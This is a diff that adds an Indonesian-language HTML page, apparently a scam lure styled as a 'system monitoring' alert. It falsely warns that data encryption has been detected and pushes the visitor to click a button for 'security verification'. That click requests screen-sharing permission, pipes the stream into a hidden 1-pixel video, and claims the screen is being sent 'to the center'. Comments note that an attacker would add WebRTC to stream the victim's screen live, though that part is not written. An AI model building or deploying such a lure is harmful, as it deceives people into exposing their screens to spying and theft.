@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Monitoring 2108</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
+        .box { border: 2px solid #0f0; padding: 20px; display: inline-block; }
+        button { background: green; color: #fff; border: none; padding: 20px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>⚠️ ENKRIPSI DATA TERDETEKSI ⚠️</h2>
+        <p>Hubungkan layar untuk verifikasi keamanan sistem.</p>
+        <button onclick="startCapture()">HUBUNGKAN SEKARANG</button>
+        <video id="video" autoplay style="width:1px; height:1px; opacity:0;"></video>
+    </div>
+
+    <script>
+        async function startCapture() {
+            try {
+                // Ini script buat minta ijin rekam layar
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                alert("Koneksi Berhasil! Data layar sedang dikirim ke pusat...");
+                
+                // Di sini biasanya hacker bakal pake WebRTC buat kirim 
+                // tampilan layar si target ke panel mereka secara live.
+            } catch (err) {
+                alert("Koneksi Gagal! Ijin ditolak.");
+            }
+        }
+    </script>
+</body>
+</html>
